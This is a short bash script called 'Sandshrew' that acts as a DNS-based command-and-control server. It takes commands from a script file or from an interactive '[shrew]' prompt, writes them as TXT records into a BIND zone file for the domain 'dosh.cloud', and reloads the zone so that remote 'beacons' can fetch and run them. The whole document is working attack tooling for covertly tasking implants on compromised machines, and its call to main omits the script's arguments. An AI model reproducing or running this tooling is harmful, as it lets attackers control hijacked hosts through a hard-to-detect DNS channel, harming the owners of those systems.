#!/bin/bash
# Sandshrew
# Takes script or user input and deploys it to the beacons
# Author - Doshmajhan


zone="/etc/bind/dosh.cloud"
regzone="dosh.cloud"
file=""

# Function to deploy pre-written script to beacons
# Arguments - file to deploy
# Returns - nothing
deploy_file(){
    # Number of lines to write
    num=$(cat $file | wc -l)
    
    # Reset file for new commands
    sed -i '11,/-End/d' $zone
    echo "num      IN  TXT \"$num\"" >> $zone

    # Loop through script and create TXT records for each command
    x=1
    while read LINE; do
        echo "$x       IN  TXT \"$LINE\"" >> $zone
        let x=x+1
    done < "$file"
    exit 

}

# Interactive shell to let user enter commands by hand
# Arguments - none
# Returns - none
interactive(){
    # Reset file
    sed -i '11,/-End/d' $zone

    x=1
    last=$x
    # Initialize number of commands
    echo "num     IN  TXT \"$x\"" >> $zone

    # Prompt to enter commands
    while true; do
        read -p "[shrew] > " input
        if [[ $input == "exit" ]]; then
            exit
        elif [[ $input == "rollout" ]]; then
            rollout
        elif [[ $input != '' ]]; then
            # Update number of commands and add new command
            sed -i "11s/$last/$x/" $zone
            echo "$x       IN  TXT \"$input\"" >> $zone
            last=$x
            let x=x+1
        fi
    done

}

# User is done entering commands, reloading the zone file
rollout(){
    roll=$(rndc reload $regzone; rndc reconfig)
}

# Main function reading in command line arguments
main(){

    # Print title and ascii art
    clear
    cat ascii.txt
    cat title.txt
    echo
    if [ -n "$1" ]; then 
        file=$1
        deploy_file
    else
        interactive
    fi
}

main
